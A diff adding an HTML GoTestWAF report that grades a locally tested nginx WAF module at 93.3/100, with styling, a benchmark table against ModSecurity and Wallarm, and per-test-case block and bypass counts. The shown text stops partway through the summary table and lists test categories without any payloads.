@@ -1,0 +1,1448 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>GoTestWaf report</title>
+    <script src="https://go-echarts.github.io/go-echarts-assets/assets/echarts.min.js"></script>
+    <link href="https://iosevka-webfonts.github.io/iosevka/iosevka.css" rel="stylesheet" />
+    <style>
+         
+        :root {
+             
+            --black: #000000;
+            --white: #FFFFFF;
+            --grey: #FAFAFB;
+            --blue: #3942EA;
+            --green: #56CC54;
+            --yellow: #FDBE10;
+            --orange: #FC7303;
+            --orange-red: #F26344;
+            --red: #F24444;
+            --light-blue: #DEE0FC;
+            --light-green: #E1F9D9;
+            --light-yellow: #FEF2B9;
+            --light-orange: #FEE1B4;
+            --light-orange-red: #f8e6df;
+            --light-red: #f8d2c4;
+            --dark-grey: #ECECEC;
+
+             
+            --br-small: 4px;
+            --br-medium: 8px;
+        }
+
+         
+        *, *::before, *::after {
+            box-sizing: border-box;
+        }
+        * {
+            margin: 0;
+        }
+        html, body {
+            height: 100%;
+        }
+        body {
+            font-family: Inter, sans-serif;
+            font-style: normal;
+            font-size: 10px;
+            line-height: 1.5;
+            isolation: isolate;
+            -webkit-font-smoothing: antialiased;
+        }
+        img, picture, video, canvas, svg {
+            display: block;
+            max-width: 100%;
+        }
+        input, button, textarea, select {
+            font: inherit;
+        }
+        p, h1, h2, h3, h4, h5, h6 {
+            overflow-wrap: break-word;
+        }
+
+         
+        .container {
+            width: 800px;
+            padding: 40px;
+            min-height: 100%;
+            margin: 0 auto;
+            color: var(--black);
+        }
+        .mono {
+            font-family: Iosevka Web, monospace;
+            font-style: normal;
+        }
+        .title {
+            font-size: 24px;
+            font-weight: 900;
+        }
+
+        .sub-title, .detail__title {
+            font-size: 20px;
+            font-weight: 700;
+        }
+        .header {
+            display: flex;
+            align-items: center;
+        }
+        .header img {
+            float: left;
+            width: 100px;
+            margin-left: 10px;
+            margin-right: 20px;
+        }
+        .about {
+            display: flex;
+            min-height: 130px;
+            margin: 24px 0 16px;
+            overflow: hidden;
+            border-radius: var(--br-medium);
+        }
+        .about__grade-a {
+            border: 1px solid var(--green);
+        }
+        .about__grade-b {
+            border: 1px solid var(--yellow);
+        }
+        .about__grade-c {
+            border: 1px solid var(--orange);
+        }
+        .about__grade-d {
+            border: 1px solid var(--orange-red);
+        }
+        .about__grade-f {
+            border: 1px solid var(--red);
+        }
+        .grade {
+            flex: 0 0 160px;
+            min-height: 100%;
+            padding: 12px 16px;
+        }
+        .about__grade-a .grade {
+            background: var(--green);
+        }
+        .about__grade-b .grade {
+            background: var(--yellow);
+        }
+        .about__grade-c .grade {
+            background: var(--orange);
+        }
+        .about__grade-d .grade {
+            background: var(--orange-red);
+        }
+        .about__grade-f .grade {
+            background: var(--red);
+        }
+        .grade__title {
+            font-weight: 700;
+            margin-bottom: 12px;
+        }
+        .grade__info{
+            position: relative;
+        }
+        .grade__info-grade {
+            font-weight: 900;
+            font-size: 80px;
+            line-height: 100%;
+        }
+        .grade__info-pont {
+            position: absolute;
+            top: -10px;
+            font-weight: 900;
+            font-size: 80px;
+            line-height: 100%;
+        }
+        .grade__info-ratio {
+            position: absolute;
+            bottom: 0;
+            right: 0;
+            font-size: 12px;
+        }
+        .desc {
+            flex: 1;
+            padding: 12px;
+        }
+        .desc__info-row {
+            margin-bottom: 8px;
+        }
+        .row__name {
+            font-weight: 700;
+        }
+        .row__content {
+            font-weight: 400;
+        }
+        .row__args {
+            font-weight: 400;
+            word-break: break-all;
+            word-wrap: break-word;
+        }
+        .grid {
+            display: grid;
+            grid-auto-columns: 1fr;
+            grid-auto-rows: 50px 1fr;
+            gap: 4px;
+        }
+        .grid__head, .grid__row, .grid__footer {
+            display: grid;
+            grid-template-columns: 228px repeat(3, 160px);
+            grid-template-rows: 1fr;
+            gap: 4px;
+        }
+        .head__item, .row__item {
+            border-radius: var(--br-small);
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 8px;
+            background: var(--grey);
+        }
+        .row__item--na {
+            background: var(--dark-grey);
+        }
+        .row__item--a {
+            background: var(--light-green);
+        }
+        .row__item--b {
+            background: var(--light-yellow);
+        }
+        .row__item--c {
+            background: var(--light-orange);
+        }
+        .row__item--d {
+            background: var(--light-orange-red);
+        }
+        .row__item--f {
+            background: var(--light-red);
+        }
+        .row__item-grade {
+            width: 30px;
+            height: 30px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            border-radius: var(--br-small);
+        }
+        .row__item-grade--na {
+            color: var(--black);
+            background: var(--grey);
+        }
+        .row__item-grade--a {
+            color: var(--white);
+            background: var(--green);
+        }
+        .row__item-grade--b {
+            color: var(--black);
+            background: var(--yellow);
+        }
+        .row__item-grade--c {
+            color: var(--white);
+            background: var(--orange);
+        }
+        .row__item-grade--d {
+            color: var(--white);
+            background: var(--orange-red);
+        }
+        .row__item-grade--f {
+            color: var(--white);
+            background: var(--red);
+        }
+        .row__item-value  {
+            font-size: 12px;
+        }
+        .grid__footer {
+            position: relative;
+            margin-top: 4px;
+        }
+        .grid__footer::before {
+            content: '';
+            position: absolute;
+            z-index: 10;
+            top: -4px;
+            left: 0;
+            width: 100%;
+            height: 1px;
+            background: var(--black);
+        }
+        .chart {
+            margin: 24px 0;
+        }
+        .benchmark {
+            page-break-after: always;
+        }
+        .benchmark__text {
+            margin: 4px 0 16px;
+        }
+        .detail {
+            margin: 24px 0 0;
+        }
+        .detail__sub-title {
+            margin: 12px 0;
+            font-size: 14px;
+            font-weight: 700;
+        }
+        .detail__sub-sub-title {
+            margin: 12px 0;
+            font-size: 12px;
+            font-weight: 700;
+        }
+        .summary__grid{
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 4px;
+        }
+        .summary__grid--head, .summary__grid--row {
+            display: grid;
+            grid-template-columns: 90px 120px repeat(6, minmax(45px, 100px));
+            gap: 4px;
+        }
+        .summary__grid--row-sum {
+            display: grid;
+            grid-template-columns: 214px repeat(6, minmax(45px, 100px));
+            gap: 4px;
+            font-weight: 700;
+            margin-bottom: 10px;
+        }
+        .summary__grid--head-item, .positive__grid--head-item {
+            font-weight: 700;
+        }
+        .positive__grid {
+            margin: 12px 0;
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 4px;
+        }
+        .positive__grid--head,
+        .positive__grid--row {
+            display: grid;
+            grid-template-columns: 350px repeat(3, minmax(45px, 125px)) 40px;
+            gap: 4px;
+        }
+        .positive__grid--failed--head,
+        .positive__grid--failed--row {
+            display: grid;
+            grid-template-columns: 390px repeat(3, minmax(45px, 125px));
+            gap: 4px;
+        }
+        .positive__grid--additional--information--row {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 4px;
+        }
+        .summary__grid--head-item, .summary__grid--row-item, .positive__grid--head-item, .positive__grid--row-item {
+            display: flex;
+            align-items: center;
+            padding: 4px;
+            word-wrap: break-word;
+            border-radius: var(--br-small);
+            background: var(--grey);
+        }
+        .positive__grid--row-item-payload {
+            display: flex;
+            align-items: center;
+            padding: 4px;
+            word-break: break-all;
+            word-wrap: break-word;
+            border-radius: var(--br-small);
+            background: var(--grey);
+        }
+    </style>
+</head>
+
+<body>
+    <main class="container">
+        <div class="header">
+            <a href="https://wallarm.com/?utm_campaign=gtw_tool&utm_medium=pdf&utm_source=github">
+                <img src="https://troll.wallarm.tools/assets/wallarm.logo.svg" alt="Wallarm Logo">
+            </a>
+            <h1 class="title">GoTestWAF<br>API / Application Security Testing Results</h1>
+        </div>
+        <div class="about about__grade-a">
+            <div class="grade">
+                <h4 class="grade__title">Overall grade:</h4>
+                <div class="grade__info">
+                     
+                    <span class="grade__info-grade">A</span>
+                    
+                    <span class="grade__info-ratio">93.3 / 100</span>
+                </div>
+            </div>
+            <div class="desc">
+                <div class="desc__info">
+                    <div class="desc__info-row">
+                        <span class="row__name">Project name</span>
+                        :
+                        <span class="row__content">generic</span>
+                        <br>
+                        <span class="row__name">URL</span>
+                        :
+                        <span class="row__content">http://localhost:8080/</span>
+                        <br>
+                        <span class="row__name">Testing Date</span>
+                        :
+                        <span class="row__content">07 December 2025</span>
+                        <br>
+                        <span class="row__name">GoTestWAF version</span>
+                        :
+                        <span class="row__content">unknown</span>
+                        <br>
+                        <span class="row__name">Test cases fingerprint</span>
+                        :
+                        <span class="row__content">4501275b9e599166099b03c7f4b538a4</span>
+                        <br>
+                        
+                        
+                        <span class="row__name">Used arguments</span>
+                        :
+                        <span class="row__args mono">--url=http://localhost:8080/ --blockStatusCodes=403 --testCasesPath=/home/william/myNginxWorkspace/nginx-http-waf-module-v2/gotestwaf_testcases --reportFormat=html</span>
+                        <br>
+                        
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+        <div class="grid">
+            <div class="grid__head">
+                <div class="head__item">Type</div>
+                <div class="head__item">True-positive tests blocked</div>
+                <div class="head__item">True-negative tests passed</div>
+                <div class="head__item">Grade</div>
+            </div>
+            <div class="grid__row">
+                <div class="row__item">API Security</div>
+                <div class="row__item row__item--na">
+                    <div class="row__item-grade row__item-grade--na">N/A</div>
+                    <div class="row__item-value">0.0%</div>
+                </div>
+                <div class="row__item row__item--na">
+                    <div class="row__item-grade row__item-grade--na">N/A</div>
+                    <div class="row__item-value">0.0%</div>
+                </div>
+                <div class="row__item row__item--na">
+                    <div class="row__item-grade row__item-grade--na">N/A</div>
+                    <div class="row__item-value">0.0%</div>
+                </div>
+            </div>
+            <div class="grid__row">
+                <div class="row__item">Application Security</div>
+                <div class="row__item row__item--a">
+                    <div class="row__item-grade row__item-grade--a">A-</div>
+                    <div class="row__item-value">90.8%</div>
+                </div>
+                <div class="row__item row__item--a">
+                    <div class="row__item-grade row__item-grade--a">A</div>
+                    <div class="row__item-value">95.7%</div>
+                </div>
+                <div class="row__item row__item--a">
+                    <div class="row__item-grade row__item-grade--a">A</div>
+                    <div class="row__item-value">93.3%</div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="chart">
+            
+            
+            <div id="app_chart" style="width:1fr; height:450px; break-inside: avoid;">
+            <script type="text/javascript">
+    "use strict";
+    let goecharts_app_chart = echarts.init(document.getElementById('app_chart'), "white", {renderer: "svg"});
+    let option_app_chart = {"color":["#5470c6","#91cc75","#fac858","#ee6666","#73c0de","#3ba272","#fc8452","#9a60b4","#ea7ccc"],"dataset":{"source":null},"legend":{"show":false,"type":"","data":[""]},"radar":{"indicator":[{"name":"128kb sql injection (100.0%)","max":100,"color":"#333333"},{"name":"32kb rce (100.0%)","max":100,"color":"#333333"},{"name":"32kb xss (100.0%)","max":100,"color":"#333333"},{"name":"32kb sql injection (100.0%)","max":100,"color":"#333333"},{"name":"8kb rce (100.0%)","max":100,"color":"#333333"},{"name":"8kb sql injection (100.0%)","max":100,"color":"#333333"},{"name":"xss (95.3%)","max":100,"color":"#333333"},{"name":"128kb xss (100.0%)","max":100,"color":"#333333"},{"name":"shell (75.0%)","max":100,"color":"#333333"},{"name":"64kb rce (100.0%)","max":100,"color":"#333333"},{"name":"64kb sql injection (100.0%)","max":100,"color":"#333333"},{"name":"64kb xss (100.0%)","max":100,"color":"#333333"},{"name":"community-lfi-multipart (100.0%)","max":100,"color":"#333333"},{"name":"lfi (100.0%)","max":100,"color":"#333333"},{"name":"rawrequest test (100.0%)","max":100,"color":"#333333"},{"name":"rce (81.8%)","max":100,"color":"#333333"},{"name":"128kb rce (100.0%)","max":100,"color":"#333333"},{"name":"useragent (100.0%)","max":100,"color":"#333333"},{"name":"path traversal (80.0%)","max":100,"color":"#333333"},{"name":"sql injection (69.4%)","max":100,"color":"#333333"},{"name":"16kb sql injection (100.0%)","max":100,"color":"#333333"},{"name":"16kb xss (100.0%)","max":100,"color":"#333333"},{"name":"8kb xss (100.0%)","max":100,"color":"#333333"},{"name":"16kb rce (100.0%)","max":100,"color":"#333333"}],"splitArea":{"show":true},"splitLine":{"show":true}},"series":[{"type":"radar","smooth":false,"connectNulls":false,"showSymbol":false,"waveAnimation":false,"renderLabelForZeroData":false,"selectedMode":false,"animation":false,"data":[{"value":[100,100,100,100,100,100,95.35,100,75,100,100,100,100,100,100,81.82,100,100,80,69.44,100,100,100,100]}]}],"title":{"text":"Application Security","textStyle":{"color":"#000000"},"right":"center"},"tooltip":{"show":false}}
+;
+	let action_app_chart = {"areas":{},"type":""}
+;
+    goecharts_app_chart.setOption(option_app_chart);
+ 	goecharts_app_chart.dispatchAction(action_app_chart);
+</script>
+            </div>
+            
+        </div>
+        
+        <div class="benchmark">
+            <h2 class="sub-title">Benchmarks against other solutions</h2>
+            
+            <div class="grid">
+                <div class="grid__head">
+                    <div class="head__item">Type</div>
+                    <div class="head__item">API Security</div>
+                    <div class="head__item">Application Security</div>
+                    <div class="head__item">Overall score</div>
+                </div>
+                
+                <div class="grid__row">
+                    <div class="row__item">ModSecurity PARANOIA=1</div>
+                    <div class="row__item row__item--f">
+                        <div class="row__item-grade row__item-grade--f">F</div>
+                        <div class="row__item-value">42.9%</div>
+                    </div>
+                    <div class="row__item row__item--d">
+                        <div class="row__item-grade row__item-grade--d">D&#43;</div>
+                        <div class="row__item-value">67.6%</div>
+                    </div>
+                    <div class="row__item row__item--f">
+                        <div class="row__item-grade row__item-grade--f">F</div>
+                        <div class="row__item-value">55.2%</div>
+                    </div>
+                </div>
+                
+                <div class="grid__row">
+                    <div class="row__item">ModSecurity PARANOIA=2</div>
+                    <div class="row__item row__item--f">
+                        <div class="row__item-grade row__item-grade--f">F</div>
+                        <div class="row__item-value">57.1%</div>
+                    </div>
+                    <div class="row__item row__item--f">
+                        <div class="row__item-grade row__item-grade--f">F</div>
+                        <div class="row__item-value">58.9%</div>
+                    </div>
+                    <div class="row__item row__item--f">
+                        <div class="row__item-grade row__item-grade--f">F</div>
+                        <div class="row__item-value">58.0%</div>
+                    </div>
+                </div>
+                
+                <div class="grid__row">
+                    <div class="row__item">ModSecurity PARANOIA=3</div>
+                    <div class="row__item row__item--b">
+                        <div class="row__item-grade row__item-grade--b">B</div>
+                        <div class="row__item-value">85.7%</div>
+                    </div>
+                    <div class="row__item row__item--f">
+                        <div class="row__item-grade row__item-grade--f">F</div>
+                        <div class="row__item-value">50.9%</div>
+                    </div>
+                    <div class="row__item row__item--d">
+                        <div class="row__item-grade row__item-grade--d">D&#43;</div>
+                        <div class="row__item-value">68.3%</div>
+                    </div>
+                </div>
+                
+                <div class="grid__row">
+                    <div class="row__item">ModSecurity PARANOIA=4</div>
+                    <div class="row__item row__item--a">
+                        <div class="row__item-grade row__item-grade--a">A&#43;</div>
+                        <div class="row__item-value">100.0%</div>
+                    </div>
+                    <div class="row__item row__item--f">
+                        <div class="row__item-grade row__item-grade--f">F</div>
+                        <div class="row__item-value">36.8%</div>
+                    </div>
+                    <div class="row__item row__item--d">
+                        <div class="row__item-grade row__item-grade--d">D&#43;</div>
+                        <div class="row__item-value">68.4%</div>
+                    </div>
+                </div>
+                
+
+                <div class="grid__row">
+                    <div class="row__item"><a href="https://www.wallarm.com/request-demo">Wallarm</a></div>
+                    <div class="row__item row__item--a">
+                        <div class="row__item-grade row__item-grade--a">A&#43;</div>
+                        <div class="row__item-value">100.0%</div>
+                    </div>
+                    <div class="row__item row__item--a">
+                        <div class="row__item-grade row__item-grade--a">A&#43;</div>
+                        <div class="row__item-value">97.7%</div>
+                    </div>
+                    <div class="row__item row__item--a">
+                        <div class="row__item-grade row__item-grade--a">A&#43;</div>
+                        <div class="row__item-value">98.9%</div>
+                    </div>
+                </div>
+
+                <div class="grid__footer">
+                    <div class="row__item">Your project</div>
+                    <div class="row__item row__item--na">
+                        <div class="row__item-grade row__item-grade--na">N/A</div>
+                        <div class="row__item-value">0.0%</div>
+                    </div>
+                    <div class="row__item row__item--a">
+                        <div class="row__item-grade row__item-grade--a">A</div>
+                        <div class="row__item-value">93.3%</div>
+                    </div>
+                    <div class="row__item row__item--a">
+                        <div class="row__item-grade row__item-grade--a">A</div>
+                        <div class="row__item-value">93.3%</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="detail">
+            <h2 class="detail__title">Details</h2>
+            <h3 class="detail__sub-title">Summary</h3>
+            <p>Total requests sent: 478</p>
+            <p>Number of blocked requests: 311</p>
+            <p>Number of passed requests: 166</p>
+            
+            <p>Number of unresolved requests: 1</p>
+            
+            <p>Number of failed requests: 0</p>
+            
+            <h4 class="detail__sub-sub-title">True-positive tests</h4>
+            <div class="summary__grid">
+                <div class="summary__grid--head">
+                    <div class="summary__grid--head-item">Test set</div>
+                    <div class="summary__grid--head-item">Test case</div>
+                    <div class="summary__grid--head-item">Percentage</div>
+                    <div class="summary__grid--head-item">Blocked</div>
+                    <div class="summary__grid--head-item">Bypassed</div>
+                    
+                    <div class="summary__grid--head-item">Unresolved</div>
+                    
+                    <div class="summary__grid--head-item">Sent</div>
+                    <div class="summary__grid--head-item">Failed</div>
+                </div>
+                
+                    
+                <div class="summary__grid--row">
+                    <div class="summary__grid--row-item">community</div>
+                    <div class="summary__grid--row-item">community-128kb-rce</div>
+                    <div class="summary__grid--row-item">100.00%</div>
+                    <div class="summary__grid--row-item">1</div>
+                    <div class="summary__grid--row-item">0</div>
+                    
+                    <div class="summary__grid--row-item">0</div>
+                    
+                    <div class="summary__grid--row-item">1</div>
+                    <div class="summary__grid--row-item">0</div>
+                </div>
+                    
+                <div class="summary__grid--row">
+                    <div class="summary__grid--row-item">community</div>
+                    <div class="summary__grid--row-item">community-128kb-sqli</div>
+                    <div class="summary__grid--row-item">100.00%</div>
+                    <div class="summary__grid--row-item">1</div>
+                    <div class="summary__grid--row-item">0</div>
+                    
+                    <div class="summary__grid--row-item">0</div>
+                    
+                    <div class="summary__grid--row-item">1</div>
+                    <div class="summary__grid--row-item">0</div>
+                </div>
+                    
+                <div class="summary__grid--row">
+                    <div class="summary__grid--row-item">community</div>
+                    <div class="summary__grid--row-item">community-128kb-xss</div>
+                    <div class="summary__grid--row-item">100.00%</div>
+                    <div class="summary__grid--row-item">1</div>
+                    <div class="summary__grid--row-item">0</div>
+                    
+                    <div class="summary__grid--row-item">0</div>
+                    
+                    <div class="summary__grid--row-item">1</div>
+                    <div class="summary__grid--row-item">0</div>
+                </div>
+                    
+                <div class="summary__grid--row">
+                    <div class="summary__grid--row-item">community</div>
+                    <div class="summary__grid--row-item">community-16kb-rce</div>
+                    <div class="summary__grid--row-item">100.00%</div>
+                    <div class="summary__grid--row-item">1</div>
+                    <div class="summary__grid--row-item">0</div>
+                    
+                    <div class="summary__grid--row-item">0</div>
+                    
+                    <div class="summary__grid--row-item">1</div>
+                    <div class="summary__grid--row-item">0</div>
+                </div>
+                    
+                <div class="summary__grid--row">
+                    <div class="summary__grid--row-item">community</div>
+                    <div class="summary__grid--row-item">community-16kb-sqli</div>
+                    <div class="summary__grid--row-item">100.00%</div>
+                    <div class="summary__grid--row-item">1</div>
+                    <div class="summary__grid--row-item">0</div>
+                    
+                    <div class="summary__grid--row-item">0</div>
+                    
+                    <div class="summary__grid--row-item">1</div>
+                    <div class="summary__grid--row-item">0</div>
+                </div>
+                    
+                <div class="summary__grid--row">
+                    <div class="summary__grid--row-item">community</div>
+                    <div class="summary__grid--row-item">community-16kb-xss</div>
+                    <div class="summary__grid--row-item">100.00%</div>
+                    <div class="summary__grid--row-item">1</div>
+                    <div class="summary__grid--row-item">0</div>
+                    
+                    <div class="summary__grid--row-item">0</div>
+                    
+                    <div class="summary__grid--row-item">1</div>
+                    <div class="summary__grid--row-item">0</div>
+                </div>
+                    
+                <div class="summary__grid--row">
+                    <div class="summary__grid--row-item">community</div>
+                    <div class="summary__grid--row-item">community-32kb-rce</div>
+                    <div class="summary__grid--row-item">100.00%</div>
+                    <div class="summary__grid--row-item">1</div>
+                    <div class="summary__grid--row-item">0</div>
+                    
+                    <div class="summary__grid--row-item">0</div>
+                    
+                    <div class="summary__grid--row-item">1</div>
+                    <div class="summary__grid--row-item">0</div>
+                </div>
+                    
+                <div class="summary__grid--row">
+                    <div class="summary__grid--row-item">community</div>
+                    <div class="summary__grid--row-item">community-32kb-sqli</div>
+                    <div class="summary__grid--row-item">100.00%</div>
+                    <div class="summary__grid--row-item">1</div>
+                    <div class="summary__grid--row-item">0</div>
+                    
+                    <div class="summary__grid--row-item">0</div>
+                    
+                    <div class="summary__grid--row-item">1</div>
+                    <div class="summary__grid--row-item">0</div>
+                </div>
+                    
+                <div class="summary__grid--row">
+                    <div class="summary__grid--row-item">community</div>
+                    <div class="summary__grid--row-item">community-32kb-xss</div>
+                    <div class="summary__grid--row-item">100.00%</div>
+                    <div class="summary__grid--row-item">1</div>
+                    <div class="summary__grid--row-item">0</div>
+                    
+                    <div class="summary__grid--row-item">0</div>
+                    
+                    <div class="summary__grid--row-item">1</div>
+                    <div class="summary__grid--row-item">0</div>
+                </div>
+                    
+                <div class="summary__grid--row">
+                    <div class="summary__grid--row-item">community</div>
+                    <div class="summary__grid--row-item">community-64kb-rce</div>
+                    <div class="summary__grid--row-item">100.00%</div>
+                    <div class="summary__grid--row-item">1</div>
+                    <div class="summary__grid--row-item">0</div>
+                    
+                    <div class="summary__grid--row-item">0</div>
+                    
+                    <div class="summary__grid--row-item">1</div>
+                    <div class="summary__grid--row-item">0</div>
+                </div>
+                    
+                <div class="summary__grid--row">
+                    <div class="summary__grid--row-item">community</div>
+                    <div class="summary__grid--row-item">community-64kb-sqli</div>
+                    <div class="summary__grid--row-item">100.00%</div>
+                    <div class="summary__grid--row-item">1</div>
+                    <div class="summary__grid--row-item">0</div>
+                    
+                    <div class="summary__grid--row-item">0</div>
+                    
+                    <div class="summary__grid--row-item">1</div>
+                    <div class="summary__grid--row-item">0</div>
+                </div>
+                    
+                <div class="summary__grid--row">
+                    <div class="summary__grid--row-item">community</div>
+                    <div class="summary__grid--row-item">community-64kb-xss</div>
+                    <div class="summary__grid--row-item">100.00%</div>
+                    <div class="summary__grid--row-item">1</div>
+                    <div class="summary__grid--row-item">0</div>
+                    
+                    <div class="summary__grid--row-item">0</div>
+                    
+                    <div class="summary__grid--row-item">1</div>
+                    <div class="summary__grid--row-item">0</div>
+                </div>
+                    
+                <div class="summary__grid--row">
+                    <div class="summary__grid--row-item">community</div>
+                    <div class="summary__grid--row-item">community-8kb-rce</div>
+                    <div class="summary__grid--row-item">100.00%</div>
+                    <div class="summary__grid--row-item">1</div>
+                    <div class="summary__grid--row-item">0</div>
+                    
+                    <div class="summary__grid--row-item">0</div>
+                    
+                    <div class="summary__grid--row-item">1</div>
+                    <div class="summary__grid--row-item">0</div>
+                </div>
+                    
+                <div class="summary__grid--row">
+                    <div class="summary__grid--row-item">community</div>
+                    <div class="summary__grid--row-item">community-8kb-sqli</div>
+                    <div class="summary__grid--row-item">100.00%</div>
+                    <div class="summary__grid--row-item">1</div>
+                    <div class="summary__grid--row-item">0</div>
+                    
+                    <div class="summary__grid--row-item">0</div>
+                    
+                    <div class="summary__grid--row-item">1</div>
+                    <div class="summary__grid--row-item">0</div>
+                </div>
+                    
+                <div class="summary__grid--row">
+                    <div class="summary__grid--row-item">community</div>
+                    <div class="summary__grid--row-item">community-8kb-xss</div>
+                    <div class="summary__grid--row-item">100.00%</div>
+                    <div class="summary__grid--row-item">1</div>
+                    <div class="summary__grid--row-item">0</div>
+                    
+                    <div class="summary__grid--row-item">0</div>
+                    
+                    <div class="summary__grid--row-item">1</div>
+                    <div class="summary__grid--row-item">0</div>
+                </div>
+                    
+                <div class="summary__grid--row">
+                    <div class="summary__grid--row-item">community</div>
+                    <div class="summary__grid--row-item">community-lfi</div>
+                    <div class="summary__grid--row-item">100.00%</div>
+                    <div class="summary__grid--row-item">8</div>
+                    <div class="summary__grid--row-item">0</div>
+                    
+                    <div class="summary__grid--row-item">0</div>
+                    
+                    <div class="summary__grid--row-item">8</div>
+                    <div class="summary__grid--row-item">0</div>
+                </div>
+                    
+                <div class="summary__grid--row">
+                    <div class="summary__grid--row-item">community</div>
+                    <div class="summary__grid--row-item">community-lfi-multipart</div>
+                    <div class="summary__grid--row-item">100.00%</div>
+                    <div class="summary__grid--row-item">2</div>
+                    <div class="summary__grid--row-item">0</div>
+                    
+                    <div class="summary__grid--row-item">0</div>
+                    
+                    <div class="summary__grid--row-item">2</div>
+                    <div class="summary__grid--row-item">0</div>
+                </div>
+                    
+                <div class="summary__grid--row">
+                    <div class="summary__grid--row-item">community</div>
+                    <div class="summary__grid--row-item">community-rce</div>
+                    <div class="summary__grid--row-item">100.00%</div>
+                    <div class="summary__grid--row-item">4</div>
+                    <div class="summary__grid--row-item">0</div>
+                    
+                    <div class="summary__grid--row-item">0</div>
+                    
+                    <div class="summary__grid--row-item">4</div>
+                    <div class="summary__grid--row-item">0</div>
+                </div>
+                    
+                <div class="summary__grid--row">
+                    <div class="summary__grid--row-item">community</div>
+                    <div class="summary__grid--row-item">community-rce-rawrequests</div>
+                    <div class="summary__grid--row-item">100.00%</div>
+                    <div class="summary__grid--row-item">3</div>
+                    <div class="summary__grid--row-item">0</div>
+                    
+                    <div class="summary__grid--row-item">0</div>
+                    
+                    <div class="summary__grid--row-item">3</div>
+                    <div class="summary__grid--row-item">0</div>
+                </div>
+                    
+                <div class="summary__grid--row">
+                    <div class="summary__grid--row-item">community</div>
+                    <div class="summary__grid--row-item">community-sqli</div>
+                    <div class="summary__grid--row-item">91.67%</div>
+                    <div class="summary__grid--row-item">11</div>
+                    <div class="summary__grid--row-item">1</div>
+                    
+                    <div class="summary__grid--row-item">0</div>
+                    
+                    <div class="summary__grid--row-item">12</div>
+                    <div class="summary__grid--row-item">0</div>
+                </div>
+                    
+                <div class="summary__grid--row">
+                    <div class="summary__grid--row-item">community</div>
+                    <div class="summary__grid--row-item">community-user-agent</div>
+                    <div class="summary__grid--row-item">100.00%</div>
+                    <div class="summary__grid--row-item">9</div>
+                    <div class="summary__grid--row-item">0</div>
+                    
+                    <div class="summary__grid--row-item">0</div>
+                    
+                    <div class="summary__grid--row-item">9</div>
+                    <div class="summary__grid--row-item">0</div>
+                </div>
+                    
+                <div class="summary__grid--row">
+                    <div class="summary__grid--row-item">community</div>
+                    <div class="summary__grid--row-item">community-xss</div>
+                    <div class="summary__grid--row-item">97.12%</div>
+                    <div class="summary__grid--row-item">101</div>
+                    <div class="summary__grid--row-item">3</div>
+                    
+                    <div class="summary__grid--row-item">0</div>
+                    
+                    <div class="summary__grid--row-item">104</div>
+                    <div class="summary__grid--row-item">0</div>
+                </div>
+                    
+                    
+                <div class="summary__grid--row-sum">
+                    <div class="summary__grid--row-item">Summary for community</div>
+                    <div class="summary__grid--row-item">99.49%</div>
+                    <div class="summary__grid--row-item">153</div>
+                    <div class="summary__grid--row-item">4</div>
+                    
+                    <div class="summary__grid--row-item">0</div>
+                    
+                    <div class="summary__grid--row-item">157</div>
+                    <div class="summary__grid--row-item">0</div>
+                </div>
+                    
+                
+                    
+                <div class="summary__grid--row">
+                    <div class="summary__grid--row-item">owasp</div>
+                    <div class="summary__grid--row-item">path-traversal</div>
+                    <div class="summary__grid--row-item">80.00%</div>
+                    <div class="summary__grid--row-item">8</div>
+                    <div class="summary__grid--row-item">2</div>
+                    
+                    <div class="summary__grid--row-item">0</div>
+                    
+                    <div class="summary__grid--row-item">10</div>
+                    <div class="summary__grid--row-item">0</div>
+                </div>
+                    
+                <div class="summary__grid--row">
+                    <div class="summary__grid--row-item">owasp</div>
+                    <div class="summary__grid--row-item">rce</div>
+                    <div class="summary__grid--row-item">50.00%</div>
+                    <div class="summary__grid--row-item">3</div>
+                    <div class="summary__grid--row-item">3</div>
+                    
+                    <div class="summary__grid--row-item">0</div>
+                    
+                    <div class="summary__grid--row-item">6</div>
+                    <div class="summary__grid--row-item">0</div>
+                </div>
+                    
+                <div class="summary__grid--row">
+                    <div class="summary__grid--row-item">owasp</div>
+                    <div class="summary__grid--row-item">rce-urlparam</div>
+                    <div class="summary__grid--row-item">88.89%</div>
+                    <div class="summary__grid--row-item">8</div>
+                    <div class="summary__grid--row-item">1</div>
+                    
+                    <div class="summary__grid--row-item">0</div>
+                    
+                    <div class="summary__grid--row-item">9</div>
+                    <div class="summary__grid--row-item">0</div>
+                </div>
+                    
+                <div class="summary__grid--row">
+                    <div class="summary__grid--row-item">owasp</div>
+                    <div class="summary__grid--row-item">rce-urlpath</div>
+                    <div class="summary__grid--row-item">100.00%</div>
+                    <div class="summary__grid--row-item">3</div>
+                    <div class="summary__grid--row-item">0</div>
+                    
+                    <div class="summary__grid--row-item">0</div>
+                    
+                    <div class="summary__grid--row-item">3</div>
+                    <div class="summary__grid--row-item">0</div>
+                </div>
+                    
+                <div class="summary__grid--row">
+                    <div class="summary__grid--row-item">owasp</div>
+                    <div class="summary__grid--row-item">shell-injection</div>
+                    <div class="summary__grid--row-item">75.00%</div>
+                    <div class="summary__grid--row-item">12</div>
+                    <div class="summary__grid--row-item">4</div>
+                    
+                    <div class="summary__grid--row-item">0</div>
+                    
+                    <div class="summary__grid--row-item">16</div>
+                    <div class="summary__grid--row-item">0</div>
+                </div>
+                    
+                <div class="summary__grid--row">
+                    <div class="summary__grid--row-item">owasp</div>
+                    <div class="summary__grid--row-item">sql-injection</div>
+                    <div class="summary__grid--row-item">58.33%</div>
+                    <div class="summary__grid--row-item">14</div>
+                    <div class="summary__grid--row-item">10</div>
+                    
+                    <div class="summary__grid--row-item">0</div>
+                    
+                    <div class="summary__grid--row-item">24</div>
+                    <div class="summary__grid--row-item">0</div>
+                </div>
+                    
+                <div class="summary__grid--row">
+                    <div class="summary__grid--row-item">owasp</div>
+                    <div class="summary__grid--row-item">xss-scripting</div>
+                    <div class="summary__grid--row-item">93.69%</div>
+                    <div class="summary__grid--row-item">104</div>
+                    <div class="summary__grid--row-item">7</div>
+                    
+                    <div class="summary__grid--row-item">1</div>
+                    
